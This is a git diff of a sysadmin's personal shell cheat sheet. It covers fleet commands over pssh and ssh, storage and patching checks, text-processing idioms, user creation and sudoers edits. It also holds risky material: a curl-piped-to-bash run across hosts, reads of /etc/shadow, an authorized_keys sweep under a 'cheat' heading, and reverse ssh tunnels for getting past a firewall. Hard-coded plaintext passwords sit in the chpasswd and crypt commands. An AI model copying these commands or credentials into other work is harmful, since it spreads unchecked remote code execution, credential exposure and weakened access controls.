-pssh -h srv_ep2 -x '-t -t' -t 0 -p 30 "cd EP2;sudo ./EP2_Driver_V2.1.1.sh -o /home/chensen/EP2"
-pssh -h srv_ep2 -t 0 -p 30 -x '-t -t' "sudo chown -R chensen EP2/EP2_Driver_V2.1.1.sh.files"
-pslurp -h ../2 -t 0 -p 30 -l chensen -r /home/chensen/EP2/EP2_Driver_V2.1.1.sh.files .
-
-###########docker error####################
-$ sudo docker run -i -t centos /bin/bash  
-unable to remount sys readonly: unable to mount sys as readonly max retries reached
-Need to vi /etc/sysconfig/docker
-other_args="--exec-driver=lxc --selinux-enabled"
-/etc/init.d/docker restart
-
-#############change timezone to Asia Shanghai#############
-sudo sed -i 's:Etc/UTC:Asia/Shanghai:' /etc/sysconfig/clock
-sudo rm -f /etc/localtime
-sudo ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
-
-#######transfer time from one format to another format###########
-[sam@oc1181188062 test]$ ssh chensen@vader "date +%s;date"
-1412036236
-Tue Sep 30 10:17:16 EST 2014
-[sam@oc1181188062 test]$ date -d@1412036236 +"%F %T"
-2014-09-30 08:17:16
-[sam@oc1181188062 test]$ date -d@1412036236 
-Tue Sep 30 08:17:16 CST 2014
-
-###########IBM ServeRAID tools###########
-./ipssend getconfig 1
-./ipssend getstatus 1
-
-############sed add prefix for each line in file##########
-sed -i 's/^.*$/chensen@&/' r6
-
-#############eval##############
-#!/bin/bash
-a="ls | wc -l"
-b="wc -l <(ls)"
-eval $a
-eval $b
-
-###############pssh & pscp.pssh######################
-#pscp.pssh -r -h srvlist rpms/ /root
-# And now I can sudo!
-[chensen@cfibml08 ~]$ echo "b28leidbp01 b28leidbp02 b28leidbp03"|tr ' ' ','
-b28leidbp01,b28leidbp02,b28leidbp03
-[chensen@cfibml08 ~]$ dsh -M -mb28leidbp01,b28leidbp02,b28leidbp03 -c "rpm -q openssl"
-dsh -M -f filename -c command
-dsh -M -mracv-l{306,409,511,512},racv-l{308..310},racv-l{506..509} -c "rpm -q openssl"
-
-pssh -x '-t -t' --inline-stdout -Hb28leidbp0{5..8} -Hy23lexlmc0{1..6} "uptime;uname -n"
-pssh -x '-t -t' --inline-stdout --host=b28leidbp0{5..8} --host=y23lexlmc0{1..6} "uptime;uname -n"
-pssh --inline-stdout --host=b28leidbp0{5..8} -I < 1.sh
-pssh --inline-stdout --host=b28leidbp0{5..8} -I         ####enter commands
-
-###################ssh#######################################
-run complex remote shell commands over ssh,without escaping quotes
-# ssh user@host $(<cmd.txt)   or ssh -t
-# ssh user@host "`cat cmd.txt`"
-# ssh user@host "bash -c $(printf '%q' "[[ -f test ]] && echo 'this works as well'")"
-run local script against remote machines,without copy it to server
-# ssh -T user@host < local.sh
-# ssh user@host 'bash -s arg1 arg2' < local.sh
-
-#####################################################
-ssh tunnel + squid               反向tunnel +squid代理突破防火墙限制使用yum
-ssh -R 1880:9.190.26.244:80 racv-l402             转发yum repo地址
-ssh -R 1880:10.62.32.27:33128 10.134.236.86       转发proxy
-本机：
-1   install squid
-2   #ssh -Nf -R 7001:localhost:3128 master  本地运行
-lab机器：
-[root@learn yum.repos.d]# grep proxy ../yum.conf
-proxy=http://127.0.0.1:7001
-
-################mysql#############
-ssh -Nf -L 3306:localhost:3306 chensen@cfibml08       正向tunnel 本地运行
-mysql -h 127.0.0.1 -P 7001 -u chensen
-
-ssh -CNfL 8443:10.20.0.2:8443 root@10.67.50.156
-ssh -CNfL 8443:10.20.0.2:8443 root@10.67.50.156
-##############firefox###########
-ssh -D 7071 chensen@cfibml10
-
-######### bond ################
-cat/proc/net/bonding/bond0 
-cd /sys/class/net/bond0
-
-######### SAN ####################
-[root@pcarshn01 ~]# lspci|grep -i fibre
-18:00.0 Fibre Channel: QLogic Corp. ISP2432-based 4Gb Fibre Channel to PCI Express HBA (rev 03)
-1e:00.0 Fibre Channel: QLogic Corp. ISP2432-based 4Gb Fibre Channel to PCI Express HBA (rev 03)
-[root@pcarshn01 ~]# ls /sys/class/fc_host/
-host3  host4
-[root@pcarshn01 ~]# ls /sys/class/fc_remote_ports
-rport-3:0-0  rport-4:0-0
-[root@pcarshn01 ~]# ls /sys/class/fc_transport/
-target3:0:0  target4:0:0
-# systool -c fc_host -v
-# systool -c fc_transport -v
-# systool -c fc_remote_ports -v
-# ls -l /sys/block/*/device
-# pvs
--------------------scan HBA-------------------------
-for i in `ls /sys/class/fc_host/`
-do
-echo "***************************************************************"
-echo "Scanning HBA on `uname -n`"
-echo "1" > /sys/class/fc_host/$i/issue_lip
-echo "- -- - -" > /sys/class/scsi_host/$i/scan
-echo "***************************************************************"
-done
-
-############ multipathd ###############################
-# echo "help" | multipathd -k
-# echo "show maps" | multipathd -k
-#multipathd -k"show maps"      no space after -k
-psh login "multipathd -k\"show maps\""
-
-multipath -ll
-udevadm info -q all -p /block/sda
-udevinfo -q all -p /block/sdx
-
-#############  udevadm ################################
-udevadm info -q path -n /dev/sda
-udevadm info -q all -p /devices/pci0000:00/0000:00:1f.2/host0/target0:0:0/0:0:0:0/block/sda
-udevadm info -q all -p /block/sda
-udevinfo -q all -p /block/sdx
-udevadm info -q all -n /dev/sda
-
-
-udevadm info -a -p /block/sda
-udevadm info -a -n /dev/sda
-udevadm info -a -p /sys/class/net/eth0
-
-
-################ iconv ############
-iconv -f UTF-16LE -t UTF-8 -o Cirats_records ALL\ Records\ -\ Department\ Specific.csv
-
-################# Reformat RHSA record ###############
-while read adid rhsa day;do echo -en "\t\t$adid\t $rhsa\t";date -d "$day" +"%d %b %Y";done< <(grep 'RHSA' aubsqsk02umilr2\(mci\)|awk '{print $5,$6,$3}'|sort -u|tr "[]" " ")
-
-function ciratsnum(){
-if [ $# != 3 ];then
-echo "Usage: ciratsnum MCI 6 filename"
-echo "Usage: ciratsnum NZ 5 filename"
-else
-account=$1
-ver=$2
-file=$3
-while read adid rhsa day
-do
-#ciratsnum=`grep $account /home/sam/Desktop/CH-apar/Cirats_records|awk -F"\t" '/'$adid'/{print $6}'`
-ciratsnum=`cat /home/sam/Desktop/CH-apar/Cirats_records|awk -F"\t" '/'$adid'/{if($3~/'$account'/ && $39~/'$ver'/) print $6}'`
-day2=`date -d "$day" +"%d %b %Y"`
-echo -e "$ciratsnum\t$adid\t $rhsa\t$day2"
-done< <(grep 'RHSA' $file|awk '{print $5,$6,$3}'|sort -u|tr "[]" " ")
-fi
-}
-
-###################check date############################
-[sam@oc1181188062 mysrvlist]$ cat checkdate.sh 
-#!/bin/bash
-if [ $# != 1 ];then
-echo "usage: ./checkdate.sh date"
-else
-input=$1
-fi
-day=`date -d "$input days" +%Y%m%d`
-for f in `ls apar/`
-do
-grep RHSA apar/$f|egrep -v 'NOT_IN|2012'|awk '{if($1<'$day')print a,$0}' a="${f%%.*}"   外部变量
-done
-
-
-################# analyse change suggestion #############
-while read srv day;do echo -n $srv >>tmp.suggestion;date -d "$day" +%Y%m%d >>tmp.suggestion;done< <(grep 2014 change_suggest.list|awk '{print $2,$3}'|grep -f myserver)
-day=`date -d "60 days" +%Y%m%d`;cat tmp.suggestion |awk -F: '{if($2<'$day')print $0}'
-
-##############  analyse installed date & BAU date ######################
-while read srv day;do echo -n "$srv $day">>33;a=`fc $srv|grep -i bau_date:|cut -d: -f2`;echo $a|awk -F- '{if(length($2)<2) $2="0"$2;if(length($3)<2) $3="0"$3;print " "$1$2$3 }'>>33;done< <(cat 11|awk '{print $2,$1}') 
-
-cat 33|awk '{if($2<$3)print $0" installed before BAU";else print $0}'
-
-##############################################################
-while read srv ipaddr;do echo -e "###########$srv#########";ping -c1 $ipaddr;done< <(cat list|awk '{print $1,$3}')
-
-##############################GPFS check################################3
-# mmlscluster
-# mmlsmgr
-# mmlsconfig
-# mmlsnsd -L
-# mmlsnsd -X
-# mmlsdisk rsidev -L
-# mmlsdisk rsidev -eL
-# mmdf rsidev
-# mmlsfs rsidev
-# psh login ifconfig bond0:0
-# crm_mon -1
-
-#############################rpm & yum ####################################
-[sam@oc1181188062 ~]$ rpm -q --queryformat %-{name}-%{version}-%{release}.%{arch}"\n" openssl
-openssl-1.0.1e-16.el6_5.7.x86_64
-openssl-1.0.1e-16.el6_5.7.i686
-
-###How to download only the rpm package without install####
-yum install yum-downloadonly
-yum upgrade --downloadonly --downloaddir=/home/chensen/packages kernel kernel-headers openssl openssl-devel nc parted
-yum install --downloadonly --downloaddir=/home/chensen/packages nc parted
-yum upgrade --downloadonly --downloaddir=/home/chensen/packages kernel nss nspr samba3x-client samba3x-common samba3x-winbind
-###How to check the files contained in rpm package and extract file from rpm package#######
-rpm2cpio mysql-sererver/application
-for i in `cat igalist`;do echo -n $i;fc $i|grep 'Application:';done
-mysql SrvInformation -e "select SrvName,Application from SrvInfo"
-mysql facts -E <<< "select * from sir where SERVER_NAME= and account_name='IBMALinux'"
-mysql facts -e "select * from sir where SERVER_NAME= and account_name='IBMALinux'\G"
-
-find peoplever.rpm | cpio -t
-rpm2cpio mysql-server.rpm | cpio -ivd "file name"
-
-################time zone################
-[root@cfibml08 Asia]# ls -l /etc/localtime
-lrwxrwxrwx 1 root root 36 Oct  2  2009 /etc/localtime -> /usr/share/zoneinfo/Australia/Sydney
-
-ln -sf /usr/share/zoneinfo/Asia/Singapore /etc/localtime
-=======================================================================================
-
-=======================change password=================================================
-[chensen@cfibml08 commands]$ cat chpass
-echo chensen:`openssl passwd -1 mc336@FB` > chpass.txt;sudo /usr/sbin/chpasswd -e <chpass.txt          ### encrypted password on server
-[chensen@cfibml08 commands]$for srv in `cat mci_srvlist_valid`;do ssh -t $srv $(<chpass);done
-[chensen@cfibml08 commands]$ for srv in `cat mci_srvlist_valid`;do ssh -t $srv "sudo chage -l chensen|grep Last";done
-
-echo chensen:`openssl passwd -1 mc336@FB` |chpasswd -e                  ###encrypt
-echo "chensen:mc336@FB" |chpasswd          ###don't need encrypt
 =======================================================================================
 sudo paste /etc/shadow /etc/passwd| awk -F: '{if($5!=90) print}' |egrep -v ':!!:|:\*:' |grep -v ':!:'
 sudo pr -mJ -t /etc/shadow /etc/passwd |awk -F: '{if($5!=90) print}' |egrep -v ':!!:|:\*:' |grep -v ':!:'
@@ -1759,6 +1628,224 @@ cat SHC_Violations |awk -F "\t" '{if($NF~/^ *$/) print $4,$5}'|cut -d" " -f1,2|a
 cat SHC_Violations |awk -F "\t" '{if($NF~/^ *$/) print $4,$5}'|cut -d" " -f1,2|awk '{++AD[$NF];server[$NF]=server[$NF]" "$1}END{for(key in AD)print key,"\t",AD[key],"\t",server[key]}' |sort -k2nr,2 >group1
 
 while read srv;do echo $srv|tr ' ' '\n'|grep -v '^$'|sort -u|tr '\n' ' ';echo;done< <(cat group1|awk -F "\t" '{print $3}')
+
+############run EP2##############  
+EP2 4 check types:
+[chensen@cfibml08 ep2_mci]$ grep -ir violation *|awk '{print $NF}'|cut -d',' -f2|grep [^0-9]|sort -u
+checkOrphanFilesDirs
+checkPermsHomeDir
+checkProcessPerms
+checkWorldWritePerm
+
+pscp -h mcilist.txt -t 0 -p 20 -r EP2/ /home/chensen
+pssh -h srv_ep2 -x '-t -t' -t 0 -p 30 "cd EP2;sudo ./EP2_Driver_V2.1.1.sh -o /home/chensen/EP2"
+pssh -h srv_ep2 -t 0 -p 30 -x '-t -t' "sudo chown -R chensen EP2/EP2_Driver_V2.1.1.sh.files"
+pslurp -h ../2 -t 0 -p 30 -l chensen -r /home/chensen/EP2/EP2_Driver_V2.1.1.sh.files .
+
+############racv############
+ssh -R 1880:9.190.26.244:80 racv-l402
+CH3773 
+as this is the latest available version in repository , same version will be installed on other servers as well in the rest changes
+
+#!/bin/bash
+# This sed grammar is not working on RHEL3
+sed -i '/^%usrmgt/i\\n\n# IPSOFT sudo access\nUser_Alias     IBM_AE_BAU = %automata\nHost_Alias    IBM_AE_HOSTS = ALL \nCmnd_Alias  IBM_UNIX_AE_BAU_CMDS =/usr/bin/su -, /bin/su -, /usr/bin/su - root, /bin/su - root\nIBM_AE_BAU  IBM_AE_HOSTS =  NOPASSWD:ALL, !IBM_NONE_SA,!IBM_SHELLS_ALL,IBM_UNIX_AE_BAU_CMDS,!IBM_SHELLESCAPE_ALL,!IBM_NONE_EDITOR\n\n' sudoers
+
+sed -i '/^%desktop_admin_r/r IPSOFT' sudoers   匹配行后插入文本
+
+perl -lne 'BEGIN{open(A,"IPSOFT");@f=<A>;}print;if(/^%desktop_admin_r/){print "\n\n @f \n\n"}' sudoers    匹配行后
+
+perl -lne 'BEGIN{open(A,"IPSOFT");@f=<A>;}if(/^%desktop_admin_r/){print "\n\n @f \n\n"};print' sudoers    匹配行前
+
+############awk with external variable######
+var=999
+echo |awk -v A=$var '{print A}'
+or
+awk '{print $0 A}' A=$var filename
+
+############sed with variable#########
+cat test.txt |sed "s/$a/ABC/g"
+cat test.txt |sed 's/'$a'/ABC/g'
+
+##cheat####
+./useradd_linux -u list2 -r -s racv-l508 -g wasadmin
+ssh racv-l506 "sudo su - --command='find / -type f -name "authorized_keys*" -exec ls {} \; -exec ssh-keygen -lf {} \;'"
+ssh racv-l400 "sudo su - -c 'find / -type f -name "authorized_keys*" -exec ls {} \; -exec ssh-keygen -lf {} \;'"
+
+############sed add prefix for each line in file##########
+sed -i 's/^.*$/chensen@&/' r6
+
+#############eval##############
+#!/bin/bash
+a="ls | wc -l"
+b="wc -l <(ls)"
+eval $a
+eval $b
+
+###############pssh & pscp.pssh######################
+#pscp.pssh -r -h srvlist rpms/ /root
+# And now I can sudo!
+[chensen@cfibml08 ~]$ echo "b28leidbp01 b28leidbp02 b28leidbp03"|tr ' ' ','
+b28leidbp01,b28leidbp02,b28leidbp03
+[chensen@cfibml08 ~]$ dsh -M -mb28leidbp01,b28leidbp02,b28leidbp03 -c "rpm -q openssl"
+dsh -M -f filename -c command
+dsh -M -mracv-l{306,409,511,512},racv-l{308..310},racv-l{506..509} -c "rpm -q openssl"
+
+pssh -x '-t -t' --inline-stdout -Hb28leidbp0{5..8} -Hy23lexlmc0{1..6} "uptime;uname -n"
+pssh -x '-t -t' --inline-stdout --host=b28leidbp0{5..8} --host=y23lexlmc0{1..6} "uptime;uname -n"
+pssh --inline-stdout --host=b28leidbp0{5..8} -I < 1.sh
+pssh --inline-stdout --host=b28leidbp0{5..8} -I         ####enter commands
+
+###################ssh#######################################
+run complex remote shell commands over ssh,without escaping quotes
+# ssh user@host $(<cmd.txt)   or ssh -t
+# ssh user@host "`cat cmd.txt`"
+# ssh user@host "bash -c $(printf '%q' "[[ -f test ]] && echo 'this works as well'")"
+run local script against remote machines,without copy it to server
+# ssh -T user@host < local.sh
+# ssh user@host 'bash -s arg1 arg2' < local.sh
+
+###########################################
+perl -e 'print crypt("Quake3@FB",q($1$x9cD$8)),"\n"'
+
+#############ssh in while loop######################
+while read srv user;do ssh -t $srv "sudo ls -l /home/${user}/.ssh/authorized_keys" </dev/null;done< <(cat h1|awk '{print $1,$2}')
+
+##############lssecfixes############################
+sudo ./lssecfixes -s other -H -d . -p |grep -v "N/A"
+rpm -qa --qf '%{name} %{version}-%{release} %{INSTALLTIME:date} \n'
+
+###################ssh key##########################
+[sam@oc1181188062 sshkey]$ cat au*.csv|awk -F',' '{print $1,$2,$3,$4,$6}'|egrep -i '/i/|/e/' |sort -k2,2 -k1,1 > personal_id.csv
+[sam@oc1181188062 sshkey]$ cat au*.csv|awk -F',' '{print $1,$2,$3,$4,$6,$NF}'|egrep -i '/s/|/f/' |sort -k2,2 -k1,1 > functionid_id.csv
+
+find /etc/sudoers -printf "%m\n"           440
+
+echo "scale=4;5200/5208" |bc
+
+dsh -M -f djs_bau "sudo /sbin/ifconfig eth1|grep -oP 'inet addr:\S+'|grep -oP '\d+.\d+.\d+.\d+'"
+dsh -M -f djs_bau "sudo /sbin/ifconfig eth0|grep -oP 'inet addr:\S+'|grep -oP '\d+.\d+.\d+.\d+'"
+#######################create ID#######################
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/db2 -g "busrsudo"
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/ihs -g "ihsadm ihssudo busrsudo"
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/was -g "wasadm wassudo busrsudo"
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/was_db2 -g "db2sudo wasadm wassudo busrsudo"
+
+#################script & scriptreplay##################
+script -t 2> timing.log -a output.session
+scriptreplay timing.log output.session
+
+#################parellel #########################
+echo -e b28leidbp0{5..8}"\n"|xargs -n1 -P4 -i{} ssh {} "uname -n"
+seq 5 8|xargs -P4 -i{} ssh b28leidbp0{} ip a
+
+#!/bin/bash
+for u in `cat djs_prod`
+do
+(
+  ssh $u "uname -n;cat /etc/*release;whoami"
+)&
+done
+wait
+
+for u in `cat ID`;do grep $u /etc/passwd;done |grep -oP '\S+@in.ibm.com'
+
+############################DJS patch########################
+lssecfixes -pF -d . 2>/dev/null | awk '/N\/A/ { next ; } ; /^ / { print $1,"-",$4; }' | sed -e 's/ //g' | sort -du
+
+lssecfixes -pF -d . 2>/dev/null | awk '/N\/A/ { next ; } ; /^ / { print $1,"-",$4; }' | sed -e 's/ //g' | sort -du| xargs yum -C --exclude=kernel upgrade -y
+echo "kernel"|xargs yum -C install -y
+
+RUN /usr/sbin/vmware-tools-upgrader
+
+/usr/bin/vmware-config-tools.pl --default
+
+###########kvm manual migration#########
+[root@kvmserver-ops ~]# cat copy.sh
+#!/bin/bash
+vmlist=`virsh list --all|sed -n '1,2!p'|awk '{print $2}'`
+for u in $vmlist
+do
+file=`virsh domblklist $u|awk '/qcow2/{print $2}'`
+date | tee -a /root/copy.log
+echo "start to scp $file..."|tee -a /root/copy.log
+scp $file kvmserver2:/var/lib/libvirt/images
+echo "copy of $file is completed !!"|tee -a /root/copy.log
+done
+
+######查询openstack kvm资源分配情况##############
+[root@cobbler ~]# ansible compute-prod -m shell -a "curl -s http://10.67.51.164/script/kvm_ops_usage.sh |bash"
+
+####################scan sparse file larger than 1GB##########
+while read num file;do if [[ $(($num)) -lt 0 ]];then echo $file $(($num));fi;done< <(find / -type f -size +1G -print0|tee|xargs -0 stat -c "%b*%B-%s %n" --)
+
+########################################################
+repeat() { while :; do $@ && return; sleep 30; done }
+cat -T file  # can display tab as ^I
+find . -iname '*.sh' -exec ./command.sh {} \;
+ls -C1|(while read u;do mv $u $u.bk;done)
+cat djs_uat1 |(while read srv user;do echo "=====$srv=====";ssh $srv "id $user" </dev/null;done)
+csplit status /SERVER/ -n 2 -s {*} -f server -b "%02d.log"
+[sam@oc1181188062 tmp]$ cat 1|echo $[ $(tr '\n' '+') 0 ]
+[sam@oc1181188062 tmp]$ cat 1|awk 'BEGIN{a=0}{a+=$0}END{print a}'
+
+################awk print new line every 9 line####################
+dsh -M -f djs_uat -c "sudo /sbin/ip a"|awk '!(NR%9){print $0"\n";next}1'
+
+##################join###################sort the file first
+join -j 1 -a1 -e " " -o '1.1,2.2' filea  fileb 
+-a filenumber  # 1 or 2   -a1   all output for file num 1
+-j FIELD   # key   equivalent to ‘-1 FIELD -2 FIELD’
+-1 FIELD  
+-2 FIELD   #compare field in file 1 and field in file 2
+-e EMPTY   
+-o FORMAT  # output format
+-t CHAR    # use CHAR as input and output field separator
+-i         # ignore lower/upper case
+-v         # like grep -v    ignore matched data
+
+############check 100GB+ file sytem################
+for u in `cat djs_srvlist`;do echo "------$u------";ssh $u "bash -c $(printf '%q' "df -h|grep -v Size|xargs -n 6|grep '[0-9]\{3,\}G'")";done
+
+############xargs #################
+[sam@oc1181188062 tmp]$ xargs -a test.txt -n 2 -L 1 bash -c 'echo $0 " is " $1'
+a  is  man
+b  is  woman
+c  is  girl
+d  is  boy
+
+find . -name "*.mef3" -print0|xargs -0 -tI{} mv {} {}.bak
+cat BAU|xargs -n1 -P5 -i{} ssh {} uptime
+echo -e b28leidbp0{5..8}"\n"|xargs -n1 -P4 -i{} ssh {} "uname -n"
+seq 5 8|xargs -P4 -i{} ssh b28leidbp0{} ip a
+
+##########查找无效InRelease文件#########
+root@apt-repo:/root# find /var/spool/apt-mirror/mirror -name InRelease -ls
+2233786    8 -rw-rw-r--   1 apt-mirror apt-mirror     7093 Nov 12 19:25 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.4/ubuntu/dists/trusty/InRelease
+2233794    8 -rw-rw-r--   1 apt-mirror apt-mirror     7093 Nov 12 19:25 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.4/ubuntu/dists/xenial/InRelease
+2232621    8 -rw-rw-r--   1 apt-mirror apt-mirror     7093 Dec 27  2017 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.2/ubuntu/dists/trusty/InRelease
+2233140    8 -rw-rw-r--   1 apt-mirror apt-mirror     7089 Dec 27  2017 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.2/ubuntu/dists/xenial/InRelease
+7325699  108 -rw-rw-r--   1 apt-mirror apt-mirror   109198 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/xenial-security/InRelease
+2492116  240 -rw-rw-r--   1 apt-mirror apt-mirror   242048 Apr 27  2018 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/bionic/InRelease
+7325736  108 -rw-rw-r--   1 apt-mirror apt-mirror   109196 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/xenial-updates/InRelease
+2489075   68 -rw-rw-r--   1 apt-mirror apt-mirror    65861 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/trusty-security/InRelease
+2492092   88 -rw-rw-r--   1 apt-mirror apt-mirror    88722 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/bionic-updates/InRelease
+2489112   68 -rw-rw-r--   1 apt-mirror apt-mirror    65859 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/trusty-updates/InRelease
+7325773  244 -rw-rw-r--   1 apt-mirror apt-mirror   246846 Apr 22  2016 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/xenial/InRelease
+2492070   88 -rw-rw-r--   1 apt-mirror apt-mirror    88724 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/bionic-security/InRelease
+2234680   68 -rw-rw-r--   1 apt-mirror apt-mirror    66230 Apr 19 13:03 /var/spool/apt-mirror/mirror/mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu/dists/
+                                                      * 此列是文件大小
+root@apt-repo:/root# find /var/spool/apt-mirror/mirror -name InRelease -a -size -100c -ls   查找小于100 bytes 的无效InRelease文件
+
+########find script#########
+#!/bin/bash
+DT=`date -d yesterday +%Y%m%d`
+(
+cd /opt/alert/processed
+find /opt/alert/processed -iname "*${DT}*dat" |xargs zip -r ${DT}.zip -
+find /opt/alert/processed -iname "*${DT}*dat" |xargs rm -f
+)
+
 =====================================================================================
 Remove users from wheel on each servers
 =====================================================================================
@@ -1884,6 +1971,54 @@ Comments     : sysid -u taoran -c "672/E/AVG37E/Wistroni/Tao.Ran taoran@cn.ibm.c
 ##################format output of df -h
 for fs in `df -h|egrep '[0-9]M|[0-9]G|[0-9]T'|awk '{print $NF}'`;do echo `df -h $fs`|awk '{printf("%-50s %-8s %-8s %-8s %-8s %s\n",$8,$9,$10,$11,$12,$NF)}';done
 
+################# Reformat RHSA record ###############
+while read adid rhsa day;do echo -en "\t\t$adid\t $rhsa\t";date -d "$day" +"%d %b %Y";done< <(grep 'RHSA' aubsqsk02umilr2\(mci\)|awk '{print $5,$6,$3}'|sort -u|tr "[]" " ")
+
+function ciratsnum(){
+if [ $# != 3 ];then
+echo "Usage: ciratsnum MCI 6 filename"
+echo "Usage: ciratsnum NZ 5 filename"
+else
+account=$1
+ver=$2
+file=$3
+while read adid rhsa day
+do
+#ciratsnum=`grep $account /home/sam/Desktop/CH-apar/Cirats_records|awk -F"\t" '/'$adid'/{print $6}'`
+ciratsnum=`cat /home/sam/Desktop/CH-apar/Cirats_records|awk -F"\t" '/'$adid'/{if($3~/'$account'/ && $39~/'$ver'/) print $6}'`
+day2=`date -d "$day" +"%d %b %Y"`
+echo -e "$ciratsnum\t$adid\t $rhsa\t$day2"
+done< <(grep 'RHSA' $file|awk '{print $5,$6,$3}'|sort -u|tr "[]" " ")
+fi
+}
+
+###################check date############################
+[sam@oc1181188062 mysrvlist]$ cat checkdate.sh 
+#!/bin/bash
+if [ $# != 1 ];then
+echo "usage: ./checkdate.sh date"
+else
+input=$1
+fi
+day=`date -d "$input days" +%Y%m%d`
+for f in `ls apar/`
+do
+grep RHSA apar/$f|egrep -v 'NOT_IN|2012'|awk '{if($1<'$day')print a,$0}' a="${f%%.*}"   外部变量
+done
+
+
+################# analyse change suggestion #############
+while read srv day;do echo -n $srv >>tmp.suggestion;date -d "$day" +%Y%m%d >>tmp.suggestion;done< <(grep 2014 change_suggest.list|awk '{print $2,$3}'|grep -f myserver)
+day=`date -d "60 days" +%Y%m%d`;cat tmp.suggestion |awk -F: '{if($2<'$day')print $0}'
+
+##############  analyse installed date & BAU date ######################
+while read srv day;do echo -n "$srv $day">>33;a=`fc $srv|grep -i bau_date:|cut -d: -f2`;echo $a|awk -F- '{if(length($2)<2) $2="0"$2;if(length($3)<2) $3="0"$3;print " "$1$2$3 }'>>33;done< <(cat 11|awk '{print $2,$1}') 
+
+cat 33|awk '{if($2<$3)print $0" installed before BAU";else print $0}'
+
+##############################################################
+while read srv ipaddr;do echo -e "###########$srv#########";ping -c1 $ipaddr;done< <(cat list|awk '{print $1,$3}')
+
 ############################rename bad named file by inode name##############
 find . -inum 2324380 -exec mv {} sdm_iga \;
 find . -size +1G -exec ls -lh {} \;
@@ -1944,6 +2079,9 @@ rm -f nd.log
 pssh -h 2 -x '-t -t' --inline-stdout "sudo sh -c 'cd /tmp;find . -type d -perm -2 -print'"
 (cd /tmp;find . \( ! -regex '.*/\..*' \) -perm -2 -print) ###don't find hidden file
 
+redis-cli get ansible_facts127.0.0.1 |jq .ansible_memory_mb
+
+vmstat -a|awk 'NR==3{print hname " active " $6"\n" hname " inact " $5}' hname=`grep -i ^Hostname zabbix_agentd.conf |cut -d'=' -f2`
 ######################find perm prefix #########################################################################################################################
 The "-" Prefix
 If a "-" is used to prefix the mode as in:
@@ -1971,13 +2109,6 @@ find . -type d -perm /2 -print
 find . -type d -perm /0002 -print
 find . -type d -perm -o=w -print
 find . -type d -perm /o=w -print
-
-###########################user administration##################################################################################################################
-usermod -aG group1 user1     add user1 to group1
-gpasswd -d user1 group1      delete user1 from group1 (redhat)
-groupmod -R user1 group1    (SUSE)
-groupmod -A user1 group1    (SUSE)
-
 ############################ tr sort uniq ###############################
 tr [options]   [source-char-list]        [replace-char-list]      <    filename
 －c：   取source-char-list的反义，所有不在source-char-list中的字符。常与-d , -s配合使用。
@@ -2001,6 +2132,7 @@ cat /etc/passwd|cut -d: -f1,3|sort -n -k2,2 -t:
 sort -t ‘ ‘ -k 3nr -k 2n facebook.txt  
 uniq -f 2 -s 2 test ###ignore first 2 fields and first 1 space character and 1 following character
 sort -u  = sort|uniq
+
 #########################useful commands###################################
 pr -mJ -t /etc/shadow /etc/passwd   ####print all files in parallel, one in each column, merge full lines
 paste /etc/shadow /etc/passwd      #####Merge files, joining line by line horizontally.
@@ -2028,7 +2160,7 @@ echo -en "\r666\b\b\b";sleep 1;echo -en "\r777\b\b\b";sleep 1;echo -en "\r888\b\
 printf '\e[1;34m%-6s\e[m' "This is text"
 printf "%b" "\e[1;34mThis is a blue text.\e[0m"
 
-################advance in bash shell################
+################ advance in bash shell ################
 [chensen@cfibml08 ~]$ grep kr iga_srvlist_valid 
 krsyslog
 kr02uap001ghor2
@@ -2073,7 +2205,7 @@ cd file
 cd file
 [sam@oc1181188062 file]$ 
 
-#######################awk###############################################
+####################### awk ###############################################
 netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,"\t",state[key]}'
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -2148,7 +2280,8 @@ web03[192.168.2.102]: mysqld ok httpd ok
 [sam@oc1181188062 Test]$ awk 'NR==FNR{s[$1]=$2;next}{print $0,s[$1]}' 10 11
 [sam@oc1181188062 Test]$ sudo awk -F: 'NR==FNR{u[$1]=$4":"$5;next}{print $0":"u[$1]}' /etc/shadow /etc/passwd
 next在多行合并，以及选择性输出方面很方便
-##############sed###########################################################  
+
+############## sed ###########################################################  
 sed '/^ *$/d' file 
 sed -i.18Mar2014 '/^ *$/d' test
 
@@ -2165,6 +2298,7 @@ sed -i.18Mar2014 '/^ *$/d' test
 [sam@oc1181188062 ~]$ awk '{print $NF}' 1.txt|tr -cs "[0-9][a-z]\n" " "
 
 [sam@oc1181188062 ~]$ cat 1.txt|awk '/http|core/{print $0}'
+
 #################Manipulating Strings#######################################
 
 [sam@oc1181188062 ~]$ a=`grep "model name" /proc/cpuinfo|uniq|cut -d: -f2`;echo ${a:1:26}
@@ -2174,6 +2308,7 @@ Intel(R) Core(TM) i5-2540M
 model name	: Intel(R) Core(TM) i5-2540M CPU @ 2.60GHz
 [sam@oc1181188062 ~]$ grep "model name" /proc/cpuinfo|uniq|awk -F: '{gsub(/\(TM\)/,"");gsub(/\(R\)/,"");print $2}'
  Intel Core i5-2540M CPU @ 2.60GHz
+ 
 ############function in .bashrc#############################################
 function ff(){
 key=$1;value=$2
